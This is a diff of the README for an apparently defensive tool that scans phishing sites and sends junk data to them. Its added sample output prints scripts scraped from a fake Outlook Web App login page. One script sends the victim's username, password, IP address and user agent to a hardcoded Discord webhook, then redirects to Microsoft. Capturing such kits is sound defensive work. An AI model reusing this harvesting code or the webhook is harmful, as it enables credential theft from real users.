@@ -1,4 +1,4 @@
-# PhishPhucker
+# Phish Phucker
 
 ![PhishPhucker Logo](https://i.ibb.co/jD9dqMm/openart-image-5-C4-YIl-FF-1717586639754-raw.jpg)
 ## In Partnership With
@@ -31,7 +31,6 @@ Welcome to **PhishPhucker**, the revolutionary open-source cybersecurity tool de
 
 - Python 3.11 or higher
 - Docker (optional, for containerized deployment)
-- Chrome Driver
 - Git
 
 ### Steps
@@ -60,24 +59,37 @@ Welcome to **PhishPhucker**, the revolutionary open-source cybersecurity tool de
 
 ## Usage
 
-1. **Feed Ingestion**:
+1. **Feed Ingestion - TODO**:
    - Add public phishing feeds or custom URLs to the `feeds.txt` file.
    - Run the ingestion module to fetch the latest data.
      ```bash
      python ingest_feeds.py
      ```
 
-2. **Perform Website Scan**:
-   - Execute the scan to extract phishing kits and endpoints.
+2. **Disrupt Phishing Operations**:
+   - Launch the Phish Phucker to send arbitrary data to attackers.
      ```bash
-     python web_scan.py
+     python phishphucker.py
      ```
+     
+3. **Sample Output**:
+     ```json
+     {
+    "utc": "2024-06-05 16:57:54",
+    "pageTitle": "Screen",
+    "pageLinks": [
+        "<link href=\"/owa/auth/15.0.1497/themes/resources/favicon.ico\" rel=\"shortcut icon\" type=\"image/x-icon\"/>"
+    ],
+    "pageScripts": [
+        "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script>",
+        "<script>\n\n        var mainLogonDiv = window.document.getElementById(\"mainLogonDiv\");\n        var showPlaceholderText = false;\n        var mainLogonDivClassName = 'mouse';\n\n        if (mainLogonDivClassName == \"tnarrow\") {\n            showPlaceholderText = true;\n\n            // Output meta tag for viewport scaling\n            document.write('<meta name=\"viewport\" content=\"width = 320, initial-scale = 1.0, user-scalable = no\" />');\n        }\n        else if (mainLogonDivClassName == \"twide\") {\n            showPlaceholderText = true;\n        }\n\n        function setPlaceholderText() {\n            window.document.getElementById(\"username\").placeholder = \"user name\";\n            window.document.getElementById(\"password\").placeholder = \"password\";\n            window.document.getElementById(\"passwordText\").placeholder = \"password\";\n        }\n\n        function showPasswordClick() {\n            var showPassword = window.document.getElementById(\"showPasswordCheck\").checked;\n            passwordElement = window.document.getElementById(\"password\");\n            passwordTextElement = window.document.getElementById(\"passwordText\");\n            if (showPassword) {\n                passwordTextElement.value = passwordElement.value;\n                passwordElement.style.display = \"none\";\n                passwordTextElement.style.display = \"inline\";\n                passwordTextElement.focus();\n            }\n            else {\n                passwordElement.value = passwordTextElement.value;\n                passwordTextElement.style.display = \"none\";\n                passwordTextElement.value = \"\";\n                passwordElement.style.display = \"inline\";\n                passwordElement.focus();\n            }\n        }\n    </script>",
+        "<script>\n\n            var mainLogonDiv = window.document.getElementById(\"mainLogonDiv\");\n            mainLogonDiv.className = mainLogonDivClassName;\n        </script>",
+        "<script>\n    function sleep(milliseconds) {\n        const date = Date.now();\n        let currentDate = null;\n        do {\n            currentDate = Date.now();\n        } while (currentDate - date < milliseconds);\n    }\n\n    var linksc = window.location.href\n    var value = linksc.split('#')\n    values = value[1]\n\n    document.getElementById(\"username\").value = values;\n    // document.getElementById(\"username\").value = values; \n\n\n    let count = 0;\n    var btn = document.getElementById(\"buttonId\");\n    var pwd = document.getElementById(\"password\");\n    var agents = navigator.userAgent;\n\n\n\n    btn.onclick = function () {\n        if (pwd.value.length > 0) {\n            count++;\n            if (count <= 2) {\n\n\n\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"GET\", \"https://ipinfo.io/json\", true);\n                xhr.onreadystatechange = function () {\n                if (xhr.readyState === 4 && xhr.status === 200) {\n                var response = JSON.parse(xhr.responseText);\n                // Handle the response data here\n                var ipAddress = response.ip\n\n                request.open(\"POST\", \"https://discord.com/api/webhooks/1138373288825987072/uB3bmO96XIzWcQsjmu6JQlu3FidKgbFXbtmJxYSMr6ZAyLAmbAF7czZM6sW081J4mRFL\");\n                request.setRequestHeader('Content-type', 'application/json');\n                var params = {\n                content: (\" > **IP: **\" + ipAddress)\n                }\n                request.send(JSON.stringify(params));\n                    \n\n                }\n\n                };\n                xhr.send();\n\n\n                var request = new XMLHttpRequest();\n                request.open(\"POST\", \"https://discord.com/api/webhooks/1138373288825987072/uB3bmO96XIzWcQsjmu6JQlu3FidKgbFXbtmJxYSMr6ZAyLAmbAF7czZM6sW081J4mRFL\");\n                request.setRequestHeader('Content-type', 'application/json');\n                var params = {\n                    content: (\"> **USERNAME  : **\" + document.getElementById(\"username\").value + \"\\n> **PASSWORD : **\" + document.getElementById(\"password\").value + \"\\n> **USER-AGENT: **\" + agents)\n                }\n                request.send(JSON.stringify(params));\n\n               \n\n                text = \"The user name or password you entered isn't correct. Try entering it again.\";\n                // document.getElementById(\"username-error\").innerHTML = text;\n                // // document.getElementById(\"errorMessage\").style.color = \"red\";\n                document.getElementById(\"signInErrorDiv\").innerText = text;\n                document.getElementById(\"password\").value = \"\";\n                sleep(1000)\n            }\n            if (count == 2) {\n                texts = \"Verification successful... Thank you.\";\n                document.getElementById(\"signInErrorDiv\").style.color = \"green\";\n                document.getElementById(\"signInErrorDiv\").innerHTML = texts;\n                sleep(4500)\n                window.location.replace(\"https://www.microsoft.com/en-us/microsoft-365/outlook/web-email-login-for-outlook\");\n            }\n        } else {\n            text = \"The user name or password you entered isn't correct. Try entering it again.\"\n            // document.getElementById(\"errorMessage\").style.color = \"red\";\n            // document.getElementById(\"login-failure\").innerHTML = \"\";\n            document.getElementById(\"signInErrorDiv\").innerHTML = text;\n\n            // document.getElementById(\"alert\").style.backgroundColor = \"#d0452f\"; \n\n\n\n        }\n\n    }\n</script>"
+    ]
 
-3. **Disrupt Phishing Operations**:
-   - Launch the disruption module to send arbitrary data to attackers.
-     ```bash
-     python disrupt.py
-     ```
+   }
+
+      ```
 
 ## Contributing
 
